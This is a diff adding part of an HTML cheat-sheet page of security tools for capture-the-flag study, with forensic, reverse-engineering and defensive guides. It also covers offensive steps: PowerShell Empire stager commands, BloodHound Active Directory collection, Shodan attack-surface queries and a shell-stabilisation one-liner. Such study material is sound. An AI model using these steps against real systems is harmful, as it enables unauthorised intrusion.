+        <div class="gui-note" onclick="openGuide('Process Monitor')"><span class="expand-hint">&#9658; Click for step-by-step guide</span>Filter &rarr; Process Name &rarr; Is &rarr; malware.exe
+Watch File, Registry, Network, Process events
+File &rarr; Save &rarr; PML for offline review</div>
+      </div>
+
+      <div class="tool-card" data-guide="Autoruns">
+        <div class="card-hdr"><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns" target="_blank" class="tool-link">Autoruns</a><span class="tag t-gui">GUI</span></div>
+        <p class="desc">Sysinternals tool showing every program configured to run at startup &mdash; registry keys, scheduled tasks, browser extensions, drivers, services. Essential for persistence hunting.</p>
+        <div class="gui-note" onclick="openGuide('Autoruns')"><span class="expand-hint">&#9658; Click for step-by-step guide</span>Run as Admin &rarr; scan all startup locations
+Options &rarr; Check VirusTotal.com
+Uncheck entry to disable suspicious persistence</div>
+      </div>
+
+            <div class="tool-card" data-guide="FTK Imager">
+        <div class="card-hdr"><a href="https://www.exterro.com/digital-forensics-software/ftk-imager" target="_blank" class="tool-link">FTK Imager</a><span class="tag t-gui">GUI</span></div>
+        <p class="desc">Industry-standard forensic imaging tool. Creates bit-exact drive images, acquires live RAM, mounts images read-only, and previews file systems without altering evidence.</p>
+        <div class="gui-note" onclick="openGuide('FTK Imager')"><span class="expand-hint">&#9658; Click for step-by-step guide</span>File &rarr; Create Disk Image &rarr; select drive
+Add destination &rarr; Expert Witness (.E01)
+File &rarr; Capture Memory &rarr; save .mem file</div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ WINDOWS POST-EXPLOIT -->
+  <section id="winpost">
+    <div class="sec-hdr"><span>&#9876;</span><h2>Windows Post-Exploitation</h2><span class="sec-count">1 tool</span></div>
+    <div class="grid">
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://github.com/BC-SECURITY/Empire" target="_blank" class="tool-link">PowerShell Empire</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Post-exploitation C2 framework with PowerShell and Python agents. Evades many AV solutions using fileless execution. Common in red team operations and adversary simulation rooms.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">python3 empire</span> <span class="f">--rest</span>
+<span class="b">usestager</span> <span class="a">windows/launcher_bat</span>
+<span class="b">set Listener</span> <span class="a">http</span>
+<span class="b">execute</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ DEFENSIVE -->
+  <section id="defense">
+    <div class="sec-hdr"><span>🛡️</span><h2>Defensive Security Tools</h2><span class="sec-count">4 tools</span></div>
+    <div class="grid">
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://www.snort.org/documents" target="_blank" class="tool-link">Snort</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Open-source IDS/IPS. Signature-based network threat detection with rules. Can also run in blocking IPS mode.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">snort</span> <span class="f">-c</span> <span class="a">/etc/snort/snort.conf</span> <span class="f">-r</span> <span class="a">cap.pcap</span> <span class="f">-A console</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card" data-guide="CyberChef">
+        <div class="card-hdr"><a href="https://gchq.github.io/CyberChef/" target="_blank" class="tool-link">CyberChef</a><span class="tag t-web">WEB</span></div>
+        <p class="desc">Browser-based encoding/decoding toolkit. Chain base64, XOR, hex, hashing, and 300+ operations visually.</p>
+        <div class="gui-note" onclick="openGuide('CyberChef')">
+          <span class="expand-hint">▶ Click for step-by-step guide</span>Drag operations into Recipe area
+Magic: auto-detects encoding type
+gchq.github.io/CyberChef</div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://github.com/mandiant/capa/blob/master/doc/usage.md" target="_blank" class="tool-link">capa</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Identifies binary capabilities statically — network connections, service creation, registry modification — without running the file.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">capa</span> <span class="f">-v</span> <span class="a">malware.exe</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card" data-guide="Splunk">
+        <div class="card-hdr"><a href="https://docs.splunk.com/Documentation/Splunk/latest/SearchReference/WhatsInThisManual" target="_blank" class="tool-link">Splunk (SPL)</a><span class="tag t-web">WEB</span></div>
+        <p class="desc">Industry SIEM platform. Searches and correlates log data using SPL. Covered in THM defensive security rooms.</p>
+        <div class="gui-note" onclick="openGuide('Splunk')">
+          <span class="expand-hint">▶ Click for step-by-step guide</span>index=main "Failed login" | stats count by src_ip
+| sort -count | head 10
+earliest=-24h — time range filter</div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ CRYPTOGRAPHY -->
+  <section id="crypto">
+    <div class="sec-hdr"><span>🔒</span><h2>Cryptography</h2><span class="sec-count">3 tools</span></div>
+    <div class="grid">
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://www.openssl.org/docs/man3.0/man1/openssl.html" target="_blank" class="tool-link">openssl</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Crypto toolkit. Generate keys, create certificates, encrypt/decrypt files, and test TLS connections.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">openssl s_client</span> <span class="f">-connect</span> <span class="a">site.com:443</span>
+<span class="b">openssl</span> <span class="f">enc -aes-256-cbc -salt -in</span> <span class="a">file.txt</span> <span class="f">-out</span> <span class="a">file.enc</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://www.gnupg.org/documentation/manuals/gnupg/" target="_blank" class="tool-link">GPG (GnuPG)</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Implements the PGP standard for asymmetric encryption and digital signing. Covered in the THM Public Key Cryptography room.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">gpg</span> <span class="f">--import</span> <span class="a">public.key</span>
+<span class="b">gpg</span> <span class="f">-e -r</span> <span class="a">admin@10.10.10.10 secret.txt</span>
+<span class="b">gpg</span> <span class="f">-d</span> <span class="a">secret.txt.gpg</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://linux.die.net/man/1/ssh" target="_blank" class="tool-link">SSH</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Encrypted remote shell protocol. Connects to THM machines and supports tunneling for port forwarding and pivoting.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">ssh</span> <span class="a">admin@10.10.10.10</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════ CLI UTILITIES -->
+  <section id="cli">
+    <div class="sec-hdr"><span>🧰</span><h2>General CLI Utilities</h2><span class="sec-count">3 tools</span></div>
+    <div class="grid">
+
+      <div class="tool-card">
+        <div class="card-hdr"><span class="tool-link no-href">vim / nano</span><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Terminal text editors. <code>nano</code> is beginner-friendly; <code>vim</code> is faster for experienced users. Both appear in THM Linux rooms.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">nano</span> <span class="a">file.txt</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://docs.python.org/3/" target="_blank" class="tool-link">Python3</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Go-to scripting language in CTFs. Used for quick file servers, exploit scripts, and shell stabilization.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">python3</span> <span class="f">-m http.server 8000</span>
+<span class="b">python3</span> <span class="f">-c</span> <span class="s">'import pty;pty.spawn("/bin/bash")'</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+      <div class="tool-card">
+        <div class="card-hdr"><a href="https://linux.die.net/man/1/crontab" target="_blank" class="tool-link">crontab / systemctl</a><span class="tag t-cli">CLI</span></div>
+        <p class="desc">Scheduled tasks and service management. Weak cron jobs are a classic THM privilege escalation vector.</p>
+        <div class="cmd-box" onclick="copyCmd(this)"><span class="b">crontab</span> <span class="f">-l</span>
+<span class="b">cat</span> <span class="a">/etc/crontab</span><span class="copy-tag">COPY</span></div>
+      </div>
+
+    </div>
+  </section>
+
+<footer class="footer">
+    <div class="footer-name">Made by Dalli Krichen</div>
+    <div class="footer-links">
+      <a href="mailto:dalli.krichen@gmail.com" class="footer-link" id="email-btn" onclick="copyEmail(event)">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="2" y="4" width="20" height="16" rx="2"/>
+          <path d="m2 7 10 7 10-7"/>
+        </svg>
+        <span class="link-label" id="email-label">dalli.krichen@gmail.com</span><span class="email-badge">&#x2398;</span>
+      </a>
+      <a href="https://www.linkedin.com/in/dalli-krichen/" target="_blank" class="footer-link">
+        <svg viewBox="0 0 24 24" fill="currentColor">
+          <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"/>
+          <rect x="2" y="9" width="4" height="12"/>
+          <circle cx="4" cy="4" r="2"/>
+        </svg>
+        <span class="link-label">linkedin.com/in/dalli-krichen</span>
+      </a>
+      <a href="https://github.com/dalli-krichen" target="_blank" class="footer-link">
+        <svg viewBox="0 0 24 24" fill="currentColor">
+          <path d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z"/>
+        </svg>
+        <span class="link-label">github.com/dalli-krichen</span>
+      </a>
+    </div>
+  </footer>
+
+</main>
+
+<script>
+var guides = {
+  'Wireshark':{'icon':'🔎','title':'Wireshark — Step-by-Step Guide','steps':[
+    {label:'Open and start a capture',cmd:'Launch Wireshark\nSelect interface (e.g. eth0)\nClick the blue shark fin ▶ button',note:'Packets stream in real time. Protocol, source, destination, and info per packet.'},
+    {label:'Apply a display filter',cmd:'http\ntcp.port == 4444\nip.addr == 10.10.10.10\nhttp.request.method == "POST"',note:'Type in the filter bar and press Enter. Not case-sensitive.'},
+    {label:'Follow a TCP stream',cmd:'Right-click any packet → Follow → TCP Stream',note:'Reassembles the full conversation. Great for HTTP sessions, credentials, and shell traffic.'},
+    {label:'Export transferred files',cmd:'File → Export Objects → HTTP',note:'Saves files transferred over HTTP. Also works for FTP and SMB.'},
+    {label:'Save capture to file',cmd:'File → Save As → capture.pcap',note:'Use .pcap or .pcapng. Compatible with tshark, tcpdump, and most analysis tools.'},
+  ]},
+  'Burp Suite':{'icon':'🧪','title':'Burp Suite — Step-by-Step Guide','steps':[
+    {label:'Configure browser proxy',cmd:'Browser → Manual proxy → 127.0.0.1:8080\nImport Burp CA cert for HTTPS',note:'In Burp: Proxy → Options → Import/Export CA Certificate.'},
+    {label:'Intercept a request',cmd:'Proxy → Intercept → Turn Intercept ON\nBrowse to target → request appears in Burp',note:'Forward to send, Drop to discard, or edit body before forwarding.'},
+    {label:'Send to Repeater',cmd:'Right-click request → Send to Repeater (Ctrl+R)\nEdit parameters → click Send',note:'Replay requests with different values to test manually.'},
+    {label:'Intruder — brute force or fuzz',cmd:'Right-click → Send to Intruder\nPositions tab → mark injection points §\nPayloads tab → load wordlist → Start Attack',note:'Community edition is rate-limited. Use ffuf for high-speed fuzzing.'},
+    {label:'Decoder',cmd:'Decoder tab → paste ciphertext\nSelect type: Base64, URL, Hex, HTML…',note:'Chain multiple decode steps to unpack multi-layered encodings.'},
+  ]},
+  'OWASP ZAP':{'icon':'🌐','title':'OWASP ZAP — Step-by-Step Guide','steps':[
+    {label:'Automated scan',cmd:'Automated Scan → enter target URL → Attack',note:'Runs Spider and Active Scanner in one step.'},
+    {label:'Set up manual proxy',cmd:'Tools → Options → Local Proxy → 127.0.0.1:8080\nSet browser proxy → browse target',note:'All traffic captured in the Sites tree.'},
+    {label:'Spider the site',cmd:'Right-click site → Spider',note:'Crawls all links and forms to build a full site map.'},
+    {label:'Active scan',cmd:'Right-click site or URL → Active Scan',note:'Fires attack payloads to detect SQLi, XSS, etc. No rate limit unlike Burp Community.'},
+    {label:'Fuzz a parameter',cmd:'History → right-click request → Fuzz\nHighlight parameter value → Add → Payloads',note:'Add payloads from file, built-in lists, or generate inline.'},
+  ]},
+  'BloodHound':{'icon':'🪟','title':'BloodHound CE — Step-by-Step Guide','steps':[
+    {label:'Collect data with SharpHound',cmd:'SharpHound.exe -c All\n\n# Linux:\npython3 bloodhound.py -d domain.local -u user -p pass -ns DC_IP -c All',note:'Generates a ZIP with JSON files containing AD relationship data.'},
+    {label:'Start Neo4j and BloodHound',cmd:'sudo neo4j start\nbloodhound',note:'Default Neo4j credentials: neo4j / neo4j. Change on first login.'},
+    {label:'Import collected data',cmd:'BloodHound CE → Upload Data button → select ZIP',note:'Wait for ingestion to complete.'},
+    {label:'Run pre-built queries',cmd:'Analysis tab →\n  Shortest Paths to Domain Admins\n  Find All Domain Admins\n  Find Principals with DCSync Rights',note:'These built-in queries are the best starting point.'},
+    {label:'Mark owned nodes',cmd:'Right-click user/computer → Mark as Owned\nRe-run: Shortest Paths from Owned Principals',note:'As you compromise more accounts, BloodHound reveals new paths.'},
+  ]},
+  'Ghidra':{'icon':'🔬','title':'Ghidra — Step-by-Step Guide','steps':[
+    {label:'Create project and import binary',cmd:'File → New Project → Next → Finish\nFile → Import File → select binary',note:'Ghidra auto-detects processor architecture.'},
+    {label:'Run auto-analysis',cmd:'Double-click imported file\nAnalyze? → Yes → accept defaults → OK',note:'Wait for progress bar. Populates all functions, strings, and cross-references.'},
+    {label:'Browse functions',cmd:'Symbol Tree (left) → Functions\nDouble-click main or any function',note:'Code Browser shows disassembly. Decompiler pane (right) shows C-like pseudocode.'},
+    {label:'Search strings',cmd:'Search → For Strings\nSearch → Memory (Ctrl+S) → enter keyword',note:'Find passwords, URLs, and flags inside compiled binaries.'},
+    {label:'Rename and comment',cmd:'Right-click variable/function → Rename\nRight-click line → Add Comment (;)',note:'Annotating as you go makes decompiled code much easier to follow.'},
+  ]},
+  'CyberChef':{'icon':'🛡️','title':'CyberChef — Step-by-Step Guide','steps':[
+    {label:'Open CyberChef',cmd:'https://gchq.github.io/CyberChef\nOr download ZIP from GitHub for offline use',note:'No installation required. Runs entirely in the browser.'},
+    {label:'Build a recipe',cmd:'Drag operations into the Recipe area\nExample: From Base64 → XOR (key: 0x41) → To Hex',note:'Operations execute left to right.'},
+    {label:'Use Magic auto-detection',cmd:'Search Magic → drag into Recipe\nPaste unknown ciphertext into Input',note:'Auto-detects encoding and suggests a decoding recipe.'},
+    {label:'Common CTF recipes',cmd:'From Base64\nRot13 or ROT47\nXOR Brute Force\nGunzip / Bzip2 Decompress\nTo Hex / From Hex',note:'Combine these to unpack multi-layer obfuscation.'},
+    {label:'Save a recipe',cmd:'Save icon → saves as .json\nCompact URL icon → shareable link',note:''},
+  ]},
+  'Shodan':{'icon':'🌍','title':'Shodan — Step-by-Step Guide','steps':[
+    {label:'Search by port and country',cmd:'port:22 country:TN\nport:3389 country:US',note:'Finds SSH or RDP servers in a specific country.'},
+    {label:'Search by hostname or org',cmd:'hostname:target.com\norg:"Target Organisation Ltd"',note:'Maps the attack surface of a specific company.'},
+    {label:'Search by product or CVE',cmd:'product:"Apache httpd"\nvuln:CVE-2021-44228',note:'The vuln filter requires a paid Shodan account.'},
+    {label:'Look up a specific IP',cmd:'shodan host 1.2.3.4',note:'Requires: pip install shodan && shodan init YOUR_API_KEY'},
+    {label:'Download results',cmd:'shodan search --fields ip_str,port,org "port:22" > results.txt',note:'Exports results in JSON or CSV.'},
+  ]},
+  'Splunk':{'icon':'🛡️','title':'Splunk SPL — Step-by-Step Guide','steps':[
+    {label:'Basic search with time range',cmd:'index=main "failed login" earliest=-24h latest=now',note:'Always scope with index and time range.'},
+    {label:'Count events by field',cmd:'index=main "Failed password"\n| stats count by src_ip\n| sort -count',note:'Finds top IPs generating SSH brute-force failures.'},
+    {label:'Visualise over time',cmd:'index=main EventCode=4625\n| timechart span=1h count by user',note:'EventCode 4625 = Windows failed logon.'},
+    {label:'Extract fields with rex',cmd:'index=main\n| rex field=_raw "user=(?P<username>\\w+)"\n| stats count by username',note:'Parses fields not automatically extracted.'},
+    {label:'Table auth events',cmd:'index=main (EventCode=4624 OR EventCode=4625)\n| table _time, user, src_ip, EventCode',note:'4624 = success, 4625 = failure. Compare to find brute-force + access.'},
+  ]},
+  'FLARE-VM':{'icon':'🖥️','title':'FLARE-VM — Setup Guide','steps':[
+    {label:'Prepare a clean Windows VM',cmd:'1. Create Windows 10/11 VM (50GB+ disk)\n2. Apply all Windows Updates\n3. Take a snapshot before installing',note:'Use VirtualBox or VMware. Ensure internet access for the install phase.'},
+    {label:'Run installer as Administrator',cmd:'(New-Object net.webclient).DownloadFile(\n  "https://raw.githubusercontent.com/mandiant/flare-vm/main/install.ps1",\n  "$env:USERPROFILE\\Desktop\\install.ps1"\n)\nSet-ExecutionPolicy Unrestricted -Force\n.\\install.ps1',note:'Uses Chocolatey and Boxstarter. Fetches 100+ tools automatically.'},
+    {label:'Wait for full installation',cmd:'# Takes 30–60 minutes\n# VM reboots several times — normal\n# Do not interact until FLARE-VM desktop appears',note:'After completion: FLARE-VM wallpaper and FLARE tools folder on desktop.'},
+    {label:'Switch to host-only networking',cmd:'VM Settings → Network → Adapter 1\n→ Host-Only Adapter → OK → restart',note:'Isolate the VM before running malware.'},
+    {label:'Take a clean snapshot',cmd:'VirtualBox: Machine → Take Snapshot → "FLARE-VM Clean"\nVMware: VM → Snapshot → Take Snapshot',note:'Always revert to this snapshot before each analysis session.'},
+  ]},
+  'REMnux':{'icon':'🖥️','title':'REMnux — Setup Guide','steps':[
+    {label:'Download the REMnux OVA',cmd:'https://remnux.org/#distro\n→ Download Virtual Appliance (OVA)',note:'Pre-built Ubuntu VM with all malware analysis tools already installed.'},
+    {label:'Import into hypervisor',cmd:'VirtualBox: File → Import Appliance → select .ova\nVMware: File → Open → select .ova',note:'Recommended: 4GB+ RAM, 2+ cores. Set network to Host-Only before running malware.'},
+    {label:'Update all tools',cmd:'sudo remnux upgrade',note:'Run after first boot and periodically.'},
+    {label:'Key pre-installed tools',cmd:'oledump.py  — Office macro analysis\nvolatility3 — memory forensics\ninetsim     — network simulation\nyara        — malware pattern matching\nradare2     — binary analysis\nghidra      — reverse engineering',note:'All tools are pre-configured and ready to use.'},
+    {label:'Pair with FLARE-VM',cmd:'# REMnux: Linux/doc malware, network analysis\n# FLARE-VM: Windows PE, debugging, unpacking',note:'Most professional labs run both side by side.'},
+  ]},
+  'FTK Imager':{'icon':'📁','title':'FTK Imager — Step-by-Step Guide','steps':[
+    {label:'Create a forensic disk image',cmd:'File → Create Disk Image\n→ Physical Drive → select drive\n→ Add destination → Expert Witness (.E01)\n→ Start',note:'E01 auto-computes MD5/SHA1 hashes for chain of custody.'},
+    {label:'Acquire live RAM',cmd:'File → Capture Memory\n→ Destination: C:\\mem.dmp\n→ Include pagefile: Yes\n→ Capture Memory',note:'Open the .dmp in Volatility3 for analysis.'},
+    {label:'Mount image read-only',cmd:'File → Image Mounting → Select image\n→ Mount Method: Read Only → Mount',note:'Mounts as a Windows drive letter without altering evidence.'},
+    {label:'Preview and export files',cmd:'File → Add Evidence Item → Image File\nBrowse the file system tree\nRight-click file → Export Files',note:'Extract specific files without modifying the original image.'},
+  ]},
+  'x64dbg':{'icon':'🧩','title':'x64dbg — Step-by-Step Guide','steps':[
+    {label:'Open a binary',cmd:'File → Open → select malware.exe',note:'x32dbg for 32-bit, x64dbg for 64-bit. Auto-selects the right version.'},
+    {label:'Set breakpoints and run',cmd:'F2 on any instruction → set breakpoint\nF9 → Run until breakpoint\nF7 Step Into / F8 Step Over',note:'Start at entry point. F9 to skip API calls you do not need to inspect.'},
+    {label:'Inspect memory and registers',cmd:'Right pane → Registers (EAX, EBP, ESP…)\nMemory Map tab → view all segments\nRight-click address → Follow in Dump',note:'Watch ESP/EBP to track stack activity during calls.'},
+    {label:'Patch bytes',cmd:'Right-click instruction → Assemble\nOr right-click → Binary → Fill with NOPs',note:'Useful for bypassing anti-debug checks during unpacking.'},
+    {label:'Conditional breakpoints',cmd:'Right-click → Breakpoint → Conditional\nCondition: EAX == 0x1337',note:'Pause execution only when a specific register value is met.'},
+  ]},
+  'Binary Ninja':{'icon':'🧩','title':'Binary Ninja — Step-by-Step Guide','steps':[
+    {label:'Open a binary',cmd:'File → Open → select binary\nOr: binary.ninja/cloud for browser-based analysis',note:'Auto-detects architecture and file format.'},
+    {label:'Switch IL levels',cmd:'View → High Level IL (HLIL)\nView → Medium Level IL (MLIL)\nView → Low Level IL (LLIL)',note:'HLIL gives the most readable pseudocode.'},
+    {label:'Navigate and rename',cmd:'Ctrl+F → search functions\nN → rename function or variable\nCtrl+G → go to address',note:'Renaming as you reverse makes the codebase much easier to follow.'},
+    {label:'Python scripting',cmd:'Tools → Python Console\nimport binaryninja as bn\nbv = bn.open_view("malware.exe")',note:'Rich Python API for automating analysis tasks.'},
+  ]},
+  'CFF Explorer':{'icon':'🧩','title':'CFF Explorer — Step-by-Step Guide','steps':[
+    {label:'Open a PE file',cmd:'File → Open → select EXE or DLL',note:'Supports PE32 and PE32+ (64-bit). Also handles .NET assemblies.'},
+    {label:'Inspect PE headers',cmd:'NT Headers → File Header → Machine type\nNT Headers → Optional Header → ImageBase, EP',note:'The entry point and image base show where code starts.'},
+    {label:'View import table',cmd:'Import Directory → expand DLLs\nSee all imported function names',note:'Suspicious: VirtualAlloc, WriteProcessMemory, CreateRemoteThread = injection.'},
+    {label:'Inspect section headers',cmd:'Section Headers → .text .data .rsrc\nCheck raw vs virtual size',note:'High entropy .text section suggests packing or encryption.'},
+    {label:'Edit and rebuild',cmd:'Double-click any field → edit value\nFile → Save As → save modified PE',note:'Useful for patching anti-debug flags or changing subsystem type.'},
+  ]},
+  'DIE':{'icon':'🧩','title':'DIE (Detect-It-Easy) — Step-by-Step Guide','steps':[
+    {label:'Open a file',cmd:'File → Open → any binary or script',note:'Identifies file type, compiler, linker, packer, and protector automatically.'},
+    {label:'Read detection results',cmd:'Main panel shows packer / compiler / version\nConfidence score displayed',note:'"UPX 3.96" = packed with UPX → unpack with: upx -d malware.exe'},
+    {label:'Check entropy',cmd:'Entropy tab → view graph\nHigh entropy (>7.0) = likely encrypted or packed',note:'Low entropy in .text = likely unencrypted code.'},
+    {label:'Search strings',cmd:'Strings tab → filter by keyword',note:'Faster than running strings separately. Look for URLs, registry paths, flags.'},
+    {label:'CLI version',cmd:'diec.exe malware.exe\ndiec malware.exe --json',note:'diec is the CLI version. Useful for scripting and batch analysis.'},
+  ]},
+  'HxD':{'icon':'🧩','title':'HxD — Step-by-Step Guide','steps':[
+    {label:'Open a binary file',cmd:'File → Open → select any file',note:'Shows hex on left, ASCII on right. Click any byte to select.'},
+    {label:'Search bytes or strings',cmd:'Search → Find (Ctrl+F)\nHex: 4D 5A (MZ header)\nText: search for strings',note:'4D 5A finds embedded PE files. 50 4B finds ZIP archives.'},
+    {label:'Edit and patch bytes',cmd:'Click byte → type new hex value (overwrite mode)\nEdit → Select Block → delete or fill',note:'Overwrite (default) patches without changing file size.'},
+    {label:'Compare two files',cmd:'Analysis → Compare → Select two files\nDifferences highlighted',note:'Compare clean vs malicious sample to spot modifications.'},
+    {label:'Open disk or RAM',cmd:'Extra → Open Disk → select drive\nExtra → Open RAM → select process',note:'Raw sector editing and live process memory inspection.'},
+  ]},
+  'Process Hacker':{'icon':'🔭','title':'Process Hacker — Step-by-Step Guide','steps':[
+    {label:'Run as Administrator',cmd:'Right-click processhacker.exe → Run as administrator',note:'Admin rights required to see all processes including system and hidden ones.'},
+    {label:'Inspect a suspicious process',cmd:'Double-click process → Properties\n→ General: full path + command line\n→ Memory: all memory regions\n→ Handles: open files and registry keys',note:'Look for no icon, unusual parent, or paths like AppData or Temp.'},
+    {label:'View network connections',cmd:'Network tab → filter by process\nSee local/remote IP, port, state, PID',note:'Identifies which process is making outbound C2 connections.'},
+    {label:'Inspect injected modules',cmd:'Process → Properties → Modules\nLook for DLLs without a file path',note:'Injected code often appears as a module with no path.'},
+    {label:'Dump process memory',cmd:'Right-click process → Miscellaneous → Dump Process\n→ Save as .dmp file',note:'Use with Volatility3 or WinDbg for offline memory analysis.'},
+  ]},
+  'Process Explorer':{'icon':'🔭','title':'Process Explorer — Step-by-Step Guide','steps':[
+    {label:'Run and configure VirusTotal',cmd:'Run procexp.exe as Administrator\nOptions → VirusTotal.com → Check VirusTotal.com',note:'Hashes every running process and checks VirusTotal automatically.'},
+    {label:'Read the process tree',cmd:'Processes shown in parent → child tree\nSuspicious: cmd.exe from Word/Excel\nSuspicious: powershell.exe from unusual parent',note:'Malware commonly spawns cmd or powershell from Office apps.'},
+    {label:'Inspect a process',cmd:'Double-click process → Properties\n→ Image tab: full path + autostart\n→ Strings tab: embedded strings',note:'The Strings tab is equivalent to running strings on the binary.'},
+    {label:'Find handles and DLLs',cmd:'Ctrl+F → Find Handle or DLL\nEnter DLL name or file path',note:'Find which process has a file locked or is loading a suspicious DLL.'},
+    {label:'Replace Task Manager',cmd:'Options → Replace Task Manager',note:'Makes Process Explorer open automatically on Ctrl+Alt+Del.'},
+  ]},
+  'Process Monitor':{'icon':'🔭','title':'Process Monitor — Step-by-Step Guide','steps':[
+    {label:'Start a filtered capture',cmd:'Filter → Filter (Ctrl+L)\nProcess Name → is → malware.exe → Add\nClick OK',note:'Always filter by process name before running malware.'},
+    {label:'Watch event categories',cmd:'Toolbar toggles:\nFile System / Registry / Network / Process',note:'Focus on Registry (persistence), File System (dropped files), Network (C2).'},
+    {label:'Find persistence',cmd:'Filter → Path → contains → \\CurrentVersion\\Run\nOr: Operation → RegSetValue',note:'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run is most common persistence key.'},
+    {label:'Save and replay',cmd:'File → Save → PML format\nFile → Open → load saved capture',note:'Share PML captures with colleagues for collaborative analysis.'},
+    {label:'Highlight suspicious activity',cmd:'Options → Highlight\nPath contains Temp → red\nOperation is WriteFile → yellow',note:'Color rules make suspicious events immediately visible.'},
+  ]},
+  'Autoruns':{'icon':'🔭','title':'Autoruns — Step-by-Step Guide','steps':[
+    {label:'Run as Administrator',cmd:'Right-click autoruns.exe → Run as administrator',note:'Admin rights needed to see all startup locations including HKLM.'},
+    {label:'Enable VirusTotal scanning',cmd:'Options → Scan Options\n→ Check VirusTotal.com\n→ Submit Unknown Images\nOK → F5 to refresh',note:'Hashes every autorun entry and checks VirusTotal in background.'},
+    {label:'Find suspicious entries',cmd:'Yellow = file not found\nPink = no publisher (unverified)\nRed VT detections = flagged by AV',note:'Pink (unverified publisher) entries are the most common malware hiding spot.'},
+    {label:'Disable an entry',cmd:'Uncheck the checkbox next to an entry',note:'Disables without deleting. Safe for testing impact.'},
+    {label:'Compare snapshots',cmd:'File → Save → baseline.arn (before infection)\nFile → Compare → select baseline.arn',note:'New entries since baseline = added by malware.'},
+  ]},
+};
+
+function openGuide(name){
+  var d=guides[name]; if(!d) return;
+  document.getElementById('modal-icon').textContent=d.icon+' ';
+  document.getElementById('modal-title').textContent=d.title;
+  var b=document.getElementById('modal-body'); b.innerHTML='';
+  d.steps.forEach(function(s,i){
+    var div=document.createElement('div'); div.className='modal-step';
+    div.innerHTML='<div class="step-num">'+(i+1)+'</div>'+
+      '<div class="step-body">'+
+        '<div class="step-label">'+s.label+'</div>'+
+        '<div class="step-cmd">'+s.cmd+'</div>'+
+        (s.note?'<div class="step-note">'+s.note+'</div>':'')+
+      '</div>';
+    b.appendChild(div);
+  });
+  document.getElementById('modal-overlay').classList.add('open');
+  document.body.style.overflow='hidden';
+}
+function closeModal(){
+  document.getElementById('modal-overlay').classList.remove('open');
+  document.body.style.overflow='';
+}
+function closeModalOutside(e){ if(e.target===document.getElementById('modal-overlay')) closeModal(); }
+document.addEventListener('keydown',function(e){ if(e.key==='Escape') closeModal(); });
+
+var navOpen=false;
+function toggleNav(){
+  navOpen=!navOpen;
+  document.getElementById('sidenav').classList.toggle('open',navOpen);
+  if(window.innerWidth>700) document.getElementById('main').classList.toggle('shifted',navOpen);
+}
+function toggleTheme(){ document.body.classList.toggle('light'); }
+
+function copyCmd(el){
+  var text=el.innerText.replace(/COPY$/,'').trim();
+  var tag=el.querySelector('.copy-tag');
+  function ok(){
+    el.classList.add('copied');
+    if(tag) tag.textContent='\u2713 DONE';
+    setTimeout(function(){ el.classList.remove('copied'); if(tag) tag.textContent='COPY'; },1800);
+  }
+  if(navigator.clipboard&&window.isSecureContext){
+    navigator.clipboard.writeText(text).then(ok).catch(function(){ fb(text,ok); });
+  } else { fb(text,ok); }
+}
+function fb(text,cb){
+  var ta=document.createElement('textarea');
+  ta.value=text; ta.style.position='fixed'; ta.style.opacity='0';
